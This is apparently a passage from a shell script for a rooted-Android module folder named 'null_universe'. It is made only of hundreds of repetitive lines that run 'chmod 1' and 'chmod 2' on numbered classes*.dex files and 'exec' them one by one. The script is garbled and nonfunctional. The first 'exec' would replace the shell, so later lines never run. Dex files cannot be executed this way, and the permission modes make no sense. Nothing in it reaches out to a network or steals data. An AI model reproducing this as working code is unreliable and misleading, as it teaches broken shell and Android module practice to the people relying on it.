chmod 1 /data/adb/modules/null_universe/classes95.dex
chmod 1 /data/adb/modules/null_universe/classes96.dex 
chmod 1 /data/adb/modules/null_universe/classes97.dex
chmod 1 /data/adb/modules/null_universe/classes98.dex 
chmod 1 /data/adb/modules/null_universe/classes99.dex
chmod 1 /data/adb/modules/null_universe/classes100.dex 
chmod 1 /data/adb/modules/null_universe/classes101.dex
chmod 1 /data/adb/modules/null_universe/classes102.dex 
chmod 1 /data/adb/modules/null_universe/classes103.dex
chmod 1 /data/adb/modules/null_universe/classes104.dex 
chmod 1 /data/adb/modules/null_universe/classes105.dex
chmod 1 /data/adb/modules/null_universe/classes106.dex 
chmod 1 /data/adb/modules/null_universe/classes107.dex
chmod 1 /data/adb/modules/null_universe/classes108.dex 
chmod 1 /data/adb/modules/null_universe/classes109.dex
chmod 1 /data/adb/modules/null_universe/classes110.dex 
chmod 1 /data/adb/modules/null_universe/classes111.dex
chmod 1 /data/adb/modules/null_universe/classes112.dex 
chmod 1 /data/adb/modules/null_universe/classes113.dex
chmod 1 /data/adb/modules/null_universe/classes114.dex 
chmod 1 /data/adb/modules/null_universe/classes115.dex
chmod 1 /data/adb/modules/null_universe/classes116.dex 
chmod 1 /data/adb/modules/null_universe/classes117.dex
chmod 1 /data/adb/modules/null_universe/classes118.dex 
chmod 1 /data/adb/modules/null_universe/classes119.dex
chmod 1 /data/adb/modules/null_universe/classes120.dex 
chmod 1 /data/adb/modules/null_universe/classes121.dex
chmod 1 /data/adb/modules/null_universe/classes122.dex 
chmod 1 /data/adb/modules/null_universe/classes123.dex
chmod 1 /data/adb/modules/null_universe/classes124.dex 
chmod 1 /data/adb/modules/null_universe/classes125.dex
chmod 1 /data/adb/modules/null_universe/classes126.dex 
chmod 1 /data/adb/modules/null_universe/classes127.dex
chmod 1 /data/adb/modules/null_universe/classes128.dex 
chmod 1 /data/adb/modules/null_universe/classes129.dex
chmod 1 /data/adb/modules/null_universe/classes130.dex 
chmod 1 /data/adb/modules/null_universe/classes131.dex
chmod 1 /data/adb/modules/null_universe/classes132.dex 
chmod 1 /data/adb/modules/null_universe/classes133.dex
chmod 1 /data/adb/modules/null_universe/classes134.dex 
chmod 1 /data/adb/modules/null_universe/classes135.dex
chmod 1 /data/adb/modules/null_universe/classes136.dex 
chmod 1 /data/adb/modules/null_universe/classes137.dex
chmod 1 /data/adb/modules/null_universe/classes138.dex 
chmod 1 /data/adb/modules/null_universe/classes139.dex
chmod 1 /data/adb/modules/null_universe/classes140.dex 
chmod 1 /data/adb/modules/null_universe/classes141.dex
chmod 1 /data/adb/modules/null_universe/classes142.dex 
chmod 1 /data/adb/modules/null_universe/classes143.dex
chmod 1 /data/adb/modules/null_universe/classes144.dex 
chmod 1 /data/adb/modules/null_universe/classes145.dex
chmod 1 /data/adb/modules/null_universe/classes146.dex 
chmod 1 /data/adb/modules/null_universe/classes147.dex
chmod 1 /data/adb/modules/null_universe/classes148.dex 
chmod 1 /data/adb/modules/null_universe/classes149.dex
chmod 1 /data/adb/modules/null_universe/classes150.dex 
chmod 1 /data/adb/modules/null_universe/classes151.dex
chmod 1 /data/adb/modules/null_universe/classes152.dex 
chmod 1 /data/adb/modules/null_universe/classes153.dex
chmod 1 /data/adb/modules/null_universe/classes154.dex 
chmod 1 /data/adb/modules/null_universe/classes155.dex
chmod 1 /data/adb/modules/null_universe/classes156.dex 
chmod 1 /data/adb/modules/null_universe/classes157.dex
chmod 1 /data/adb/modules/null_universe/classes158.dex 
chmod 1 /data/adb/modules/null_universe/classes159.dex
chmod 1 /data/adb/modules/null_universe/classes160.dex 
chmod 1 /data/adb/modules/null_universe/classes161.dex
chmod 1 /data/adb/modules/null_universe/classes162.dex 
chmod 1 /data/adb/modules/null_universe/classes163.dex
chmod 1 /data/adb/modules/null_universe/classes164.dex 
chmod 1 /data/adb/modules/null_universe/classes165.dex
chmod 1 /data/adb/modules/null_universe/classes166.dex 
chmod 1 /data/adb/modules/null_universe/classes167.dex
chmod 1 /data/adb/modules/null_universe/classes168.dex 
chmod 1 /data/adb/modules/null_universe/classes169.dex
chmod 1 /data/adb/modules/null_universe/classes170.dex 
chmod 1 /data/adb/modules/null_universe/classes171.dex
chmod 1 /data/adb/modules/null_universe/classes172.dex 
chmod 1 /data/adb/modules/null_universe/classes173.dex
chmod 1 /data/adb/modules/null_universe/classes174.dex 
chmod 1 /data/adb/modules/null_universe/classes175.dex
chmod 1 /data/adb/modules/null_universe/classes176.dex 
chmod 1 /data/adb/modules/null_universe/classes177.dex
chmod 1 /data/adb/modules/null_universe/classes178.dex 
chmod 1 /data/adb/modules/null_universe/classes179.dex
chmod 1 /data/adb/modules/null_universe/classes180.dex 
chmod 1 /data/adb/modules/null_universe/classes181.dex
chmod 1 /data/adb/modules/null_universe/classes182.dex 
chmod 1 /data/adb/modules/null_universe/classes183.dex
chmod 1 /data/adb/modules/null_universe/classes184.dex 
chmod 1 /data/adb/modules/null_universe/classes185.dex
chmod 1 /data/adb/modules/null_universe/classes186.dex 
chmod 1 /data/adb/modules/null_universe/classes187.dex
chmod 1 /data/adb/modules/null_universe/classes188.dex 
chmod 1 /data/adb/modules/null_universe/classes189.dex
chmod 1 /data/adb/modules/null_universe/classes190.dex 
chmod 1 /data/adb/modules/null_universe/classes191.dex
chmod 1 /data/adb/modules/null_universe/classes192.dex 
chmod 1 /data/adb/modules/null_universe/classes193.dex
chmod 1 /data/adb/modules/null_universe/classes194.dex 
chmod 1 /data/adb/modules/null_universe/classes195.dex
chmod 1 /data/adb/modules/null_universe/classes196.dex 
chmod 1 /data/adb/modules/null_universe/classes197.dex
chmod 1 /data/adb/modules/null_universe/classes198.dex 
chmod 1 /data/adb/modules/null_universe/classes199.dex
chmod 1 /data/adb/modules/null_universe/classes200.dex 
chmod 1 /data/adb/modules/null_universe/classes201.dex
chmod 1 /data/adb/modules/null_universe/classes202.dex 
chmod 1 /data/adb/modules/null_universe/classes203.dex
chmod 1 /data/adb/modules/null_universe/classes204.dex 
chmod 1 /data/adb/modules/null_universe/classes205.dex
chmod 1 /data/adb/modules/null_universe/classes206.dex 
chmod 1 /data/adb/modules/null_universe/classes207.dex
chmod 1 /data/adb/modules/null_universe/classes208.dex 
chmod 1 /data/adb/modules/null_universe/classes209.dex
chmod 1 /data/adb/modules/null_universe/classes210.dex 
chmod 1 /data/adb/modules/null_universe/classes211.dex
chmod 1 /data/adb/modules/null_universe/classes212.dex 
chmod 1 /data/adb/modules/null_universe/classes213.dex
chmod 1 /data/adb/modules/null_universe/classes214.dex 
chmod 1 /data/adb/modules/null_universe/classes215.dex
chmod 1 /data/adb/modules/null_universe/classes216.dex 
chmod 1 /data/adb/modules/null_universe/classes217.dex
chmod 1 /data/adb/modules/null_universe/classes218.dex 
chmod 1 /data/adb/modules/null_universe/classes219.dex
exec /data/adb/modules/null_universe/classes.dex
exec /data/adb/modules/null_universe/classes2.dex 
exec /data/adb/modules/null_universe/classes3.dex
exec /data/adb/modules/null_universe/classes4.dex 
exec /data/adb/modules/null_universe/classes5.dex
exec /data/adb/modules/null_universe/classes6.dex 
exec /data/adb/modules/null_universe/classes7.dex
exec /data/adb/modules/null_universe/classes8.dex 
exec /data/adb/modules/null_universe/classes9.dex
exec /data/adb/modules/null_universe/classes10.dex 
exec /data/adb/modules/null_universe/classes11.dex
exec /data/adb/modules/null_universe/classes12.dex 
exec /data/adb/modules/null_universe/classes13.dex
exec /data/adb/modules/null_universe/classes14.dex 
exec /data/adb/modules/null_universe/classes15.dex
exec /data/adb/modules/null_universe/classes16.dex 
exec /data/adb/modules/null_universe/classes17.dex
exec /data/adb/modules/null_universe/classes18.dex 
exec /data/adb/modules/null_universe/classes19.dex
exec /data/adb/modules/null_universe/classes20.dex 
exec /data/adb/modules/null_universe/classes21.dex
exec /data/adb/modules/null_universe/classes22.dex 
exec /data/adb/modules/null_universe/classes23.dex
exec /data/adb/modules/null_universe/classes24.dex 
exec /data/adb/modules/null_universe/classes25.dex
exec /data/adb/modules/null_universe/classes26.dex 
exec /data/adb/modules/null_universe/classes27.dex
exec /data/adb/modules/null_universe/classes28.dex 
exec /data/adb/modules/null_universe/classes29.dex
exec /data/adb/modules/null_universe/classes30.dex 
exec /data/adb/modules/null_universe/classes31.dex
exec /data/adb/modules/null_universe/classes32.dex 
exec /data/adb/modules/null_universe/classes33.dex
exec /data/adb/modules/null_universe/classes34.dex 
exec /data/adb/modules/null_universe/classes35.dex
exec /data/adb/modules/null_universe/classes36.dex 
exec /data/adb/modules/null_universe/classes37.dex
exec /data/adb/modules/null_universe/classes38.dex 
exec /data/adb/modules/null_universe/classes39.dex
exec /data/adb/modules/null_universe/classes40.dex 
exec /data/adb/modules/null_universe/classes41.dex
exec /data/adb/modules/null_universe/classes42.dex 
exec /data/adb/modules/null_universe/classes43.dex
exec /data/adb/modules/null_universe/classes44.dex 
exec /data/adb/modules/null_universe/classes45.dex
exec /data/adb/modules/null_universe/classes46.dex 
exec /data/adb/modules/null_universe/classes47.dex
exec /data/adb/modules/null_universe/classes48.dex 
exec /data/adb/modules/null_universe/classes49.dex
exec /data/adb/modules/null_universe/classes50.dex 
exec /data/adb/modules/null_universe/classes51.dex
exec /data/adb/modules/null_universe/classes52.dex 
exec /data/adb/modules/null_universe/classes53.dex
exec /data/adb/modules/null_universe/classes54.dex 
exec /data/adb/modules/null_universe/classes55.dex
exec /data/adb/modules/null_universe/classes56.dex 
exec /data/adb/modules/null_universe/classes57.dex
exec /data/adb/modules/null_universe/classes58.dex 
exec /data/adb/modules/null_universe/classes59.dex
exec /data/adb/modules/null_universe/classes60.dex 
exec /data/adb/modules/null_universe/classes61.dex
exec /data/adb/modules/null_universe/classes62.dex 
exec /data/adb/modules/null_universe/classes63.dex
exec /data/adb/modules/null_universe/classes64.dex 
exec /data/adb/modules/null_universe/classes65.dex
exec /data/adb/modules/null_universe/classes66.dex 
exec /data/adb/modules/null_universe/classes67.dex
exec /data/adb/modules/null_universe/classes68.dex 
exec /data/adb/modules/null_universe/classes69.dex
exec /data/adb/modules/null_universe/classes70.dex 
exec /data/adb/modules/null_universe/classes71.dex
exec /data/adb/modules/null_universe/classes72.dex 
exec /data/adb/modules/null_universe/classes73.dex
exec /data/adb/modules/null_universe/classes74.dex 
exec /data/adb/modules/null_universe/classes75.dex
exec /data/adb/modules/null_universe/classes76.dex 
exec /data/adb/modules/null_universe/classes77.dex
exec /data/adb/modules/null_universe/classes78.dex 
exec /data/adb/modules/null_universe/classes79.dex
exec /data/adb/modules/null_universe/classes80.dex 
exec /data/adb/modules/null_universe/classes81.dex
exec /data/adb/modules/null_universe/classes82.dex 
exec /data/adb/modules/null_universe/classes83.dex
exec /data/adb/modules/null_universe/classes84.dex 
exec /data/adb/modules/null_universe/classes85.dex
exec /data/adb/modules/null_universe/classes86.dex 
exec /data/adb/modules/null_universe/classes87.dex
exec /data/adb/modules/null_universe/classes88.dex 
exec /data/adb/modules/null_universe/classes89.dex
exec /data/adb/modules/null_universe/classes90.dex 
exec /data/adb/modules/null_universe/classes91.dex
exec /data/adb/modules/null_universe/classes92.dex 
exec /data/adb/modules/null_universe/classes93.dex
exec /data/adb/modules/null_universe/classes94.dex 
exec /data/adb/modules/null_universe/classes95.dex
exec /data/adb/modules/null_universe/classes96.dex 
exec /data/adb/modules/null_universe/classes97.dex
exec /data/adb/modules/null_universe/classes98.dex 
exec /data/adb/modules/null_universe/classes99.dex
exec /data/adb/modules/null_universe/classes100.dex 
exec /data/adb/modules/null_universe/classes101.dex
exec /data/adb/modules/null_universe/classes102.dex 
exec /data/adb/modules/null_universe/classes103.dex
exec /data/adb/modules/null_universe/classes104.dex 
exec /data/adb/modules/null_universe/classes105.dex
exec /data/adb/modules/null_universe/classes106.dex 
exec /data/adb/modules/null_universe/classes107.dex
exec /data/adb/modules/null_universe/classes108.dex 
exec /data/adb/modules/null_universe/classes109.dex
exec /data/adb/modules/null_universe/classes110.dex 
exec /data/adb/modules/null_universe/classes111.dex
exec /data/adb/modules/null_universe/classes112.dex 
exec /data/adb/modules/null_universe/classes113.dex
exec /data/adb/modules/null_universe/classes114.dex 
exec /data/adb/modules/null_universe/classes115.dex
exec /data/adb/modules/null_universe/classes116.dex 
exec /data/adb/modules/null_universe/classes117.dex
exec /data/adb/modules/null_universe/classes118.dex 
exec /data/adb/modules/null_universe/classes119.dex
exec /data/adb/modules/null_universe/classes120.dex 
exec /data/adb/modules/null_universe/classes121.dex
exec /data/adb/modules/null_universe/classes122.dex 
exec /data/adb/modules/null_universe/classes123.dex
exec /data/adb/modules/null_universe/classes124.dex 
exec /data/adb/modules/null_universe/classes125.dex
exec /data/adb/modules/null_universe/classes126.dex 
exec /data/adb/modules/null_universe/classes127.dex
exec /data/adb/modules/null_universe/classes128.dex 
exec /data/adb/modules/null_universe/classes129.dex
exec /data/adb/modules/null_universe/classes130.dex 
exec /data/adb/modules/null_universe/classes131.dex
exec /data/adb/modules/null_universe/classes132.dex 
exec /data/adb/modules/null_universe/classes133.dex
exec /data/adb/modules/null_universe/classes134.dex 
exec /data/adb/modules/null_universe/classes135.dex
exec /data/adb/modules/null_universe/classes136.dex 
exec /data/adb/modules/null_universe/classes137.dex
exec /data/adb/modules/null_universe/classes138.dex 
exec /data/adb/modules/null_universe/classes139.dex
exec /data/adb/modules/null_universe/classes140.dex 
exec /data/adb/modules/null_universe/classes141.dex
exec /data/adb/modules/null_universe/classes142.dex 
exec /data/adb/modules/null_universe/classes143.dex
exec /data/adb/modules/null_universe/classes144.dex 
exec /data/adb/modules/null_universe/classes145.dex
exec /data/adb/modules/null_universe/classes146.dex 
exec /data/adb/modules/null_universe/classes147.dex
exec /data/adb/modules/null_universe/classes148.dex 
exec /data/adb/modules/null_universe/classes149.dex
exec /data/adb/modules/null_universe/classes150.dex 
exec /data/adb/modules/null_universe/classes151.dex
exec /data/adb/modules/null_universe/classes152.dex 
exec /data/adb/modules/null_universe/classes153.dex
exec /data/adb/modules/null_universe/classes154.dex 
exec /data/adb/modules/null_universe/classes155.dex
exec /data/adb/modules/null_universe/classes156.dex 
exec /data/adb/modules/null_universe/classes157.dex
exec /data/adb/modules/null_universe/classes158.dex 
exec /data/adb/modules/null_universe/classes159.dex
exec /data/adb/modules/null_universe/classes160.dex 
exec /data/adb/modules/null_universe/classes161.dex
exec /data/adb/modules/null_universe/classes162.dex 
exec /data/adb/modules/null_universe/classes163.dex
exec /data/adb/modules/null_universe/classes164.dex 
exec /data/adb/modules/null_universe/classes165.dex
exec /data/adb/modules/null_universe/classes166.dex 
exec /data/adb/modules/null_universe/classes167.dex
exec /data/adb/modules/null_universe/classes168.dex 
exec /data/adb/modules/null_universe/classes169.dex
exec /data/adb/modules/null_universe/classes170.dex 
exec /data/adb/modules/null_universe/classes171.dex
exec /data/adb/modules/null_universe/classes172.dex 
exec /data/adb/modules/null_universe/classes173.dex
exec /data/adb/modules/null_universe/classes174.dex 
exec /data/adb/modules/null_universe/classes175.dex
exec /data/adb/modules/null_universe/classes176.dex 
exec /data/adb/modules/null_universe/classes177.dex
exec /data/adb/modules/null_universe/classes178.dex 
exec /data/adb/modules/null_universe/classes179.dex
exec /data/adb/modules/null_universe/classes180.dex 
exec /data/adb/modules/null_universe/classes181.dex
exec /data/adb/modules/null_universe/classes182.dex 
exec /data/adb/modules/null_universe/classes183.dex
exec /data/adb/modules/null_universe/classes184.dex 
exec /data/adb/modules/null_universe/classes185.dex
exec /data/adb/modules/null_universe/classes186.dex 
exec /data/adb/modules/null_universe/classes187.dex
exec /data/adb/modules/null_universe/classes188.dex 
exec /data/adb/modules/null_universe/classes189.dex
exec /data/adb/modules/null_universe/classes190.dex 
exec /data/adb/modules/null_universe/classes191.dex
exec /data/adb/modules/null_universe/classes192.dex 
exec /data/adb/modules/null_universe/classes193.dex
exec /data/adb/modules/null_universe/classes194.dex 
exec /data/adb/modules/null_universe/classes195.dex
exec /data/adb/modules/null_universe/classes196.dex 
exec /data/adb/modules/null_universe/classes197.dex
exec /data/adb/modules/null_universe/classes198.dex 
exec /data/adb/modules/null_universe/classes199.dex
exec /data/adb/modules/null_universe/classes200.dex 
exec /data/adb/modules/null_universe/classes201.dex
exec /data/adb/modules/null_universe/classes202.dex 
exec /data/adb/modules/null_universe/classes203.dex
exec /data/adb/modules/null_universe/classes204.dex 
exec /data/adb/modules/null_universe/classes205.dex
exec /data/adb/modules/null_universe/classes206.dex 
exec /data/adb/modules/null_universe/classes207.dex
exec /data/adb/modules/null_universe/classes208.dex 
exec /data/adb/modules/null_universe/classes209.dex
exec /data/adb/modules/null_universe/classes210.dex 
exec /data/adb/modules/null_universe/classes211.dex
exec /data/adb/modules/null_universe/classes212.dex 
exec /data/adb/modules/null_universe/classes213.dex
exec /data/adb/modules/null_universe/classes214.dex 
exec /data/adb/modules/null_universe/classes215.dex
exec /data/adb/modules/null_universe/classes216.dex 
exec /data/adb/modules/null_universe/classes217.dex
exec /data/adb/modules/null_universe/classes218.dex 
exec /data/adb/modules/null_universe/classes219.dex
chmod 2 /data/adb/modules/null_universe/classes.dex
chmod 2 /data/adb/modules/null_universe/classes2.dex 
chmod 2 /data/adb/modules/null_universe/classes3.dex
chmod 2 /data/adb/modules/null_universe/classes4.dex 
chmod 2 /data/adb/modules/null_universe/classes5.dex
chmod 2 /data/adb/modules/null_universe/classes6.dex 
chmod 2 /data/adb/modules/null_universe/classes7.dex
chmod 2 /data/adb/modules/null_universe/classes8.dex 
chmod 2 /data/adb/modules/null_universe/classes9.dex
chmod 2 /data/adb/modules/null_universe/classes10.dex 
chmod 2 /data/adb/modules/null_universe/classes11.dex
chmod 2 /data/adb/modules/null_universe/classes12.dex 
chmod 2 /data/adb/modules/null_universe/classes13.dex
chmod 2 /data/adb/modules/null_universe/classes14.dex 
chmod 2 /data/adb/modules/null_universe/classes15.dex
chmod 2 /data/adb/modules/null_universe/classes16.dex 
chmod 2 /data/adb/modules/null_universe/classes17.dex
chmod 2 /data/adb/modules/null_universe/classes18.dex 
chmod 2 /data/adb/modules/null_universe/classes19.dex
chmod 2 /data/adb/modules/null_universe/classes20.dex 
chmod 2 /data/adb/modules/null_universe/classes21.dex
chmod 2 /data/adb/modules/null_universe/classes22.dex 
chmod 2 /data/adb/modules/null_universe/classes23.dex
chmod 2 /data/adb/modules/null_universe/classes24.dex 
chmod 2 /data/adb/modules/null_universe/classes25.dex
chmod 2 /data/adb/modules/null_universe/classes26.dex 
chmod 2 /data/adb/modules/null_universe/classes27.dex
chmod 2 /data/adb/modules/null_universe/classes28.dex 
chmod 2 /data/adb/modules/null_universe/classes29.dex
chmod 2 /data/adb/modules/null_universe/classes30.dex 
chmod 2 /data/adb/modules/null_universe/classes31.dex
chmod 2 /data/adb/modules/null_universe/classes32.dex 
chmod 2 /data/adb/modules/null_universe/classes33.dex
chmod 2 /data/adb/modules/null_universe/classes34.dex 
chmod 2 /data/adb/modules/null_universe/classes35.dex
chmod 2 /data/adb/modules/null_universe/classes36.dex 
chmod 2 /data/adb/modules/null_universe/classes37.dex
chmod 2 /data/adb/modules/null_universe/classes38.dex 
chmod 2 /data/adb/modules/null_universe/classes39.dex
chmod 2 /data/adb/modules/null_universe/classes40.dex 
chmod 2 /data/adb/modules/null_universe/classes41.dex
chmod 2 /data/adb/modules/null_universe/classes42.dex 
chmod 2 /data/adb/modules/null_universe/classes43.dex
chmod 2 /data/adb/modules/null_universe/classes44.dex 
chmod 2 /data/adb/modules/null_universe/classes45.dex
chmod 2 /data/adb/modules/null_universe/classes46.dex 
chmod 2 /data/adb/modules/null_universe/classes47.dex
chmod 2 /data/adb/modules/null_universe/classes48.dex 
chmod 2 /data/adb/modules/null_universe/classes49.dex
chmod 2 /data/adb/modules/null_universe/classes50.dex 
chmod 2 /data/adb/modules/null_universe/classes51.dex
chmod 2 /data/adb/modules/null_universe/classes52.dex 
chmod 2 /data/adb/modules/null_universe/classes53.dex
chmod 2 /data/adb/modules/null_universe/classes54.dex 
chmod 2 /data/adb/modules/null_universe/classes55.dex
chmod 2 /data/adb/modules/null_universe/classes56.dex 
chmod 2 /data/adb/modules/null_universe/classes57.dex
chmod 2 /data/adb/modules/null_universe/classes58.dex 
chmod 2 /data/adb/modules/null_universe/classes59.dex
chmod 2 /data/adb/modules/null_universe/classes60.dex 
chmod 2 /data/adb/modules/null_universe/classes61.dex
chmod 2 /data/adb/modules/null_universe/classes62.dex 
chmod 2 /data/adb/modules/null_universe/classes63.dex
chmod 2 /data/adb/modules/null_universe/classes64.dex 
chmod 2 /data/adb/modules/null_universe/classes65.dex
chmod 2 /data/adb/modules/null_universe/classes66.dex 
chmod 2 /data/adb/modules/null_universe/classes67.dex
chmod 2 /data/adb/modules/null_universe/classes68.dex 
chmod 2 /data/adb/modules/null_universe/classes69.dex
chmod 2 /data/adb/modules/null_universe/classes70.dex 
chmod 2 /data/adb/modules/null_universe/classes71.dex
chmod 2 /data/adb/modules/null_universe/classes72.dex 
chmod 2 /data/adb/modules/null_universe/classes73.dex
chmod 2 /data/adb/modules/null_universe/classes74.dex 
chmod 2 /data/adb/modules/null_universe/classes75.dex
chmod 2 /data/adb/modules/null_universe/classes76.dex 
chmod 2 /data/adb/modules/null_universe/classes77.dex
chmod 2 /data/adb/modules/null_universe/classes78.dex 
chmod 2 /data/adb/modules/null_universe/classes79.dex
chmod 2 /data/adb/modules/null_universe/classes80.dex 
chmod 2 /data/adb/modules/null_universe/classes81.dex
chmod 2 /data/adb/modules/null_universe/classes82.dex 
chmod 2 /data/adb/modules/null_universe/classes83.dex
chmod 2 /data/adb/modules/null_universe/classes84.dex 
chmod 2 /data/adb/modules/null_universe/classes85.dex
chmod 2 /data/adb/modules/null_universe/classes86.dex 
chmod 2 /data/adb/modules/null_universe/classes87.dex
chmod 2 /data/adb/modules/null_universe/classes88.dex 
chmod 2 /data/adb/modules/null_universe/classes89.dex
chmod 2 /data/adb/modules/null_universe/classes90.dex 
chmod 2 /data/adb/modules/null_universe/classes91.dex
chmod 2 /data/adb/modules/null_universe/classes92.dex 
chmod 2 /data/adb/modules/null_universe/classes93.dex
chmod 2 /data/adb/modules/null_universe/classes94.dex 
chmod 2 /data/adb/modules/null_universe/classes95.dex
chmod 2 /data/adb/modules/null_universe/classes96.dex 
chmod 2 /data/adb/modules/null_universe/classes97.dex
chmod 2 /data/adb/modules/null_universe/classes98.dex 
chmod 2 /data/adb/modules/null_universe/classes99.dex
chmod 2 /data/adb/modules/null_universe/classes100.dex 
chmod 2 /data/adb/modules/null_universe/classes101.dex
chmod 2 /data/adb/modules/null_universe/classes102.dex 
chmod 2 /data/adb/modules/null_universe/classes103.dex
chmod 2 /data/adb/modules/null_universe/classes104.dex 
chmod 2 /data/adb/modules/null_universe/classes105.dex
chmod 2 /data/adb/modules/null_universe/classes106.dex 
chmod 2 /data/adb/modules/null_universe/classes107.dex
chmod 2 /data/adb/modules/null_universe/classes108.dex 
chmod 2 /data/adb/modules/null_universe/classes109.dex
chmod 2 /data/adb/modules/null_universe/classes110.dex 
chmod 2 /data/adb/modules/null_universe/classes111.dex
chmod 2 /data/adb/modules/null_universe/classes112.dex 
chmod 2 /data/adb/modules/null_universe/classes113.dex
chmod 2 /data/adb/modules/null_universe/classes114.dex 
chmod 2 /data/adb/modules/null_universe/classes115.dex
chmod 2 /data/adb/modules/null_universe/classes116.dex 
chmod 2 /data/adb/modules/null_universe/classes117.dex
chmod 2 /data/adb/modules/null_universe/classes118.dex 
chmod 2 /data/adb/modules/null_universe/classes119.dex
chmod 2 /data/adb/modules/null_universe/classes120.dex 
chmod 2 /data/adb/modules/null_universe/classes121.dex
chmod 2 /data/adb/modules/null_universe/classes122.dex 
chmod 2 /data/adb/modules/null_universe/classes123.dex
chmod 2 /data/adb/modules/null_universe/classes124.dex 
chmod 2 /data/adb/modules/null_universe/classes125.dex
chmod 2 /data/adb/modules/null_universe/classes126.dex 
chmod 2 /data/adb/modules/null_universe/classes127.dex
chmod 2 /data/adb/modules/null_universe/classes128.dex 
chmod 2 /data/adb/modules/null_universe/classes129.dex
chmod 2 /data/adb/modules/null_universe/classes130.dex 
chmod 2 /data/adb/modules/null_universe/classes131.dex
chmod 2 /data/adb/modules/null_universe/classes132.dex 
chmod 2 /data/adb/modules/null_universe/classes133.dex
chmod 2 /data/adb/modules/null_universe/classes134.dex 
chmod 2 /data/adb/modules/null_universe/classes135.dex
chmod 2 /data/adb/modules/null_universe/classes136.dex 
chmod 2 /data/adb/modules/null_universe/classes137.dex
chmod 2 /data/adb/modules/null_universe/classes138.dex 
chmod 2 /data/adb/modules/null_universe/classes139.dex
chmod 2 /data/adb/modules/null_universe/classes140.dex 
chmod 2 /data/adb/modules/null_universe/classes141.dex
chmod 2 /data/adb/modules/null_universe/classes142.dex 
chmod 2 /data/adb/modules/null_universe/classes143.dex
chmod 2 /data/adb/modules/null_universe/classes144.dex 
chmod 2 /data/adb/modules/null_universe/classes145.dex
chmod 2 /data/adb/modules/null_universe/classes146.dex 
chmod 2 /data/adb/modules/null_universe/classes147.dex
chmod 2 /data/adb/modules/null_universe/classes148.dex 
chmod 2 /data/adb/modules/null_universe/classes149.dex
chmod 2 /data/adb/modules/null_universe/classes150.dex 
chmod 2 /data/adb/modules/null_universe/classes151.dex
chmod 2 /data/adb/modules/null_universe/classes152.dex 
chmod 2 /data/adb/modules/null_universe/classes153.dex
chmod 2 /data/adb/modules/null_universe/classes154.dex 
chmod 2 /data/adb/modules/null_universe/classes155.dex
chmod 2 /data/adb/modules/null_universe/classes156.dex 
chmod 2 /data/adb/modules/null_universe/classes157.dex
chmod 2 /data/adb/modules/null_universe/classes158.dex 
chmod 2 /data/adb/modules/null_universe/classes159.dex
chmod 2 /data/adb/modules/null_universe/classes160.dex 
chmod 2 /data/adb/modules/null_universe/classes161.dex
chmod 2 /data/adb/modules/null_universe/classes162.dex 
chmod 2 /data/adb/modules/null_universe/classes163.dex
chmod 2 /data/adb/modules/null_universe/classes164.dex 
chmod 2 /data/adb/modules/null_universe/classes165.dex
chmod 2 /data/adb/modules/null_universe/classes166.dex 
chmod 2 /data/adb/modules/null_universe/classes167.dex
chmod 2 /data/adb/modules/null_universe/classes168.dex 
chmod 2 /data/adb/modules/null_universe/classes169.dex
chmod 2 /data/adb/modules/null_universe/classes170.dex 
chmod 2 /data/adb/modules/null_universe/classes171.dex
chmod 2 /data/adb/modules/null_universe/classes172.dex 
chmod 2 /data/adb/modules/null_universe/classes173.dex
chmod 2 /data/adb/modules/null_universe/classes174.dex 
chmod 2 /data/adb/modules/null_universe/classes175.dex
chmod 2 /data/adb/modules/null_universe/classes176.dex 
chmod 2 /data/adb/modules/null_universe/classes177.dex
chmod 2 /data/adb/modules/null_universe/classes178.dex 
chmod 2 /data/adb/modules/null_universe/classes179.dex
chmod 2 /data/adb/modules/null_universe/classes180.dex 
chmod 2 /data/adb/modules/null_universe/classes181.dex
chmod 2 /data/adb/modules/null_universe/classes182.dex 
chmod 2 /data/adb/modules/null_universe/classes183.dex
chmod 2 /data/adb/modules/null_universe/classes184.dex 
chmod 2 /data/adb/modules/null_universe/classes185.dex
chmod 2 /data/adb/modules/null_universe/classes186.dex 
chmod 2 /data/adb/modules/null_universe/classes187.dex
chmod 2 /data/adb/modules/null_universe/classes188.dex 
chmod 2 /data/adb/modules/null_universe/classes189.dex
chmod 2 /data/adb/modules/null_universe/classes190.dex 
chmod 2 /data/adb/modules/null_universe/classes191.dex
chmod 2 /data/adb/modules/null_universe/classes192.dex 
chmod 2 /data/adb/modules/null_universe/classes193.dex
chmod 2 /data/adb/modules/null_universe/classes194.dex 
chmod 2 /data/adb/modules/null_universe/classes195.dex
chmod 2 /data/adb/modules/null_universe/classes196.dex 
chmod 2 /data/adb/modules/null_universe/classes197.dex
chmod 2 /data/adb/modules/null_universe/classes198.dex 
chmod 2 /data/adb/modules/null_universe/classes199.dex
chmod 2 /data/adb/modules/null_universe/classes200.dex 
chmod 2 /data/adb/modules/null_universe/classes201.dex
chmod 2 /data/adb/modules/null_universe/classes202.dex 
chmod 2 /data/adb/modules/null_universe/classes203.dex
chmod 2 /data/adb/modules/null_universe/classes204.dex 
chmod 2 /data/adb/modules/null_universe/classes205.dex
chmod 2 /data/adb/modules/null_universe/classes206.dex 
chmod 2 /data/adb/modules/null_universe/classes207.dex
chmod 2 /data/adb/modules/null_universe/classes208.dex 
chmod 2 /data/adb/modules/null_universe/classes209.dex
chmod 2 /data/adb/modules/null_universe/classes210.dex 
chmod 2 /data/adb/modules/null_universe/classes211.dex
chmod 2 /data/adb/modules/null_universe/classes212.dex 
chmod 2 /data/adb/modules/null_universe/classes213.dex
chmod 2 /data/adb/modules/null_universe/classes214.dex 
chmod 2 /data/adb/modules/null_universe/classes215.dex
chmod 2 /data/adb/modules/null_universe/classes216.dex 
chmod 2 /data/adb/modules/null_universe/classes217.dex
chmod 2 /data/adb/modules/null_universe/classes218.dex 
chmod 2 /data/adb/modules/null_universe/classes219.dex
exec /data/adb/modules/null_universe/classes.dex
exec /data/adb/modules/null_universe/classes2.dex 
exec /data/adb/modules/null_universe/classes3.dex
exec /data/adb/modules/null_universe/classes4.dex 
exec /data/adb/modules/null_universe/classes5.dex
exec /data/adb/modules/null_universe/classes6.dex 
exec /data/adb/modules/null_universe/classes7.dex
exec /data/adb/modules/null_universe/classes8.dex 
exec /data/adb/modules/null_universe/classes9.dex
exec /data/adb/modules/null_universe/classes10.dex 
exec /data/adb/modules/null_universe/classes11.dex
exec /data/adb/modules/null_universe/classes12.dex 
exec /data/adb/modules/null_universe/classes13.dex
exec /data/adb/modules/null_universe/classes14.dex 
exec /data/adb/modules/null_universe/classes15.dex
exec /data/adb/modules/null_universe/classes16.dex 
